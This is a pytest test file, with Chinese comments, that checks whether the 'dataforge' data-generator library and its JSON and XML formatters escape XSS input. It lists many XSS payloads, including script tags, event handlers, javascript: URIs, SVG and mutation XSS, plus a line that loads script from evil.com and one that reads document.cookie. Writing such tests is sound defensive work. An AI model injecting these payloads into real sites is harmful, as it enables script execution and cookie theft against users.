"""
XSS防护测试
"""

import pytest

from dataforge.core.factory import GeneratorFactory, GeneratorRegistry
from dataforge.core.generator import GeneratorConfig


@pytest.mark.security
class TestXSSPrevention:
    """XSS防护测试类"""

    def test_script_tag_injection(self):
        """测试script标签注入"""
        registry = GeneratorRegistry()
        factory = GeneratorFactory(registry)
        
        from dataforge.generators.basic.name import NameGenerator
        registry.register("name", NameGenerator)
        
        # Script标签注入尝试
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<script src='http://evil.com/xss.js'></script>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
        ]
        
        for payload in xss_payloads:
            config = GeneratorConfig("name", {"prefix": payload})
            generator = factory.create_generator(config)
            result = generator.generate_single()
            
            # 验证结果已转义或过滤
            result_str = str(result)
            assert "<script>" not in result_str.lower() or "&lt;" in result_str

    def test_event_handler_injection(self):
        """测试事件处理器注入"""
        registry = GeneratorRegistry()
        factory = GeneratorFactory(registry)
        
        from dataforge.generators.basic.name import NameGenerator
        registry.register("name", NameGenerator)
        
        # 事件处理器注入尝试
        event_payloads = [
            "<img src=x onerror=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<div onmouseover=alert('XSS')>",
        ]
        
        for payload in event_payloads:
            config = GeneratorConfig("name", {"prefix": payload})
            generator = factory.create_generator(config)
            result = generator.generate_single()
            
            # 验证结果已转义事件处理器
            result_str = str(result).lower()
            assert "onerror" not in result_str or "&" in result_str
            assert "onload" not in result_str or "&" in result_str

    def test_javascript_protocol_injection(self):
        """测试JavaScript协议注入"""
        registry = GeneratorRegistry()
        factory = GeneratorFactory(registry)
        
        from dataforge.generators.basic.name import NameGenerator
        registry.register("name", NameGenerator)
        
        # JavaScript协议注入尝试
        js_protocols = [
            "<a href='javascript:alert(\"XSS\")'>Click</a>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<form action='javascript:alert(\"XSS\")'>",
            "<object data='javascript:alert(\"XSS\")'>",
        ]
        
        for payload in js_protocols:
            config = GeneratorConfig("name", {"prefix": payload})
            generator = factory.create_generator(config)
            result = generator.generate_single()
            
            # 验证结果已过滤javascript协议
            result_str = str(result).lower()
            assert "javascript:" not in result_str or "&" in result_str

    def test_html_entity_injection(self):
        """测试HTML实体注入"""
        registry = GeneratorRegistry()
        factory = GeneratorFactory(registry)
        
        from dataforge.generators.basic.name import NameGenerator
        registry.register("name", NameGenerator)
        
        # HTML实体注入尝试
        entity_payloads = [
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        ]
        
        for payload in entity_payloads:
            config = GeneratorConfig("name", {"prefix": payload})
            generator = factory.create_generator(config)
            result = generator.generate_single()
            
            # 验证结果已处理HTML实体
            assert result is not None

    def test_svg_xss_injection(self):
        """测试SVG XSS注入"""
        registry = GeneratorRegistry()
        factory = GeneratorFactory(registry)
        
        from dataforge.generators.basic.name import NameGenerator
        registry.register("name", NameGenerator)
        
        # SVG XSS注入尝试
        svg_payloads = [
            "<svg onload=alert('XSS')>",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><animate onbegin=alert('XSS')>",
        ]
        
        for payload in svg_payloads:
            config = GeneratorConfig("name", {"prefix": payload})
            generator = factory.create_generator(config)
            result = generator.generate_single()
            
            # 验证结果已过滤SVG标签
            result_str = str(result).lower()
            assert "<svg>" not in result_str or "&lt;" in result_str

    def test_css_injection(self):
        """测试CSS注入"""
        registry = GeneratorRegistry()
        factory = GeneratorFactory(registry)
        
        from dataforge.generators.basic.name import NameGenerator
        registry.register("name", NameGenerator)
        
        # CSS注入尝试
        css_payloads = [
            "<style>body{background:url('javascript:alert(\"XSS\")')}</style>",
            "<link rel='stylesheet' href='javascript:alert(\"XSS\")'>",
            "<div style='background:url(javascript:alert(\"XSS\"))'>",
        ]
        
        for payload in css_payloads:
            config = GeneratorConfig("name", {"prefix": payload})
            generator = factory.create_generator(config)
            result = generator.generate_single()
            
            # 验证结果已过滤CSS注入
            result_str = str(result).lower()
            assert "javascript:" not in result_str or "&" in result_str

    def test_dom_based_xss(self):
        """测试DOM型XSS"""
        registry = GeneratorRegistry()
        factory = GeneratorFactory(registry)
        
        from dataforge.generators.basic.name import NameGenerator
        registry.register("name", NameGenerator)
        
        # DOM XSS尝试
        dom_payloads = [
            "#<script>alert('XSS')</script>",
            "?param=<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
        ]
        
        for payload in dom_payloads:
            config = GeneratorConfig("name", {"prefix": payload})
            generator = factory.create_generator(config)
            result = generator.generate_single()
            
            # 验证结果已处理
            assert result is not None

    def test_mutation_xss(self):
        """测试变异XSS"""
        registry = GeneratorRegistry()
        factory = GeneratorFactory(registry)
        
        from dataforge.generators.basic.name import NameGenerator
        registry.register("name", NameGenerator)
        
        # 变异XSS尝试
        mutation_payloads = [
            "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
            "<svg><style><img src=x onerror=alert(1)></style></svg>",
        ]
        
        for payload in mutation_payloads:
            config = GeneratorConfig("name", {"prefix": payload})
            generator = factory.create_generator(config)
            result = generator.generate_single()
            
            # 验证结果已处理
            assert result is not None

    def test_json_output_xss(self):
        """测试JSON输出XSS"""
        try:
            from dataforge.output.json_formatter import JSONFormatter
            
            formatter = JSONFormatter()
            
            # 包含XSS的数据
            xss_data = {
                "name": "<script>alert('XSS')</script>",
                "description": "<img src=x onerror=alert('XSS')>",
            }
            
            result = formatter.format(xss_data)
            
            # 验证JSON已正确转义
            assert "<script>" not in result or "\\" in result
            
        except ImportError:
            pytest.skip("JSON formatter not available")

    def test_xml_output_xss(self):
        """测试XML输出XSS"""
        try:
            from dataforge.output.xml_formatter import XMLFormatter
            
            formatter = XMLFormatter()
            
            # 包含XSS的数据
            xss_data = {
                "name": "<script>alert('XSS')</script>",
                "description": "<img src=x onerror=alert('XSS')>",
            }
            
            result = formatter.format(xss_data)
            
            # 验证XML已正确转义
            assert "&lt;" in result or "<![CDATA[" in result
            
        except ImportError:
            pytest.skip("XML formatter not available")
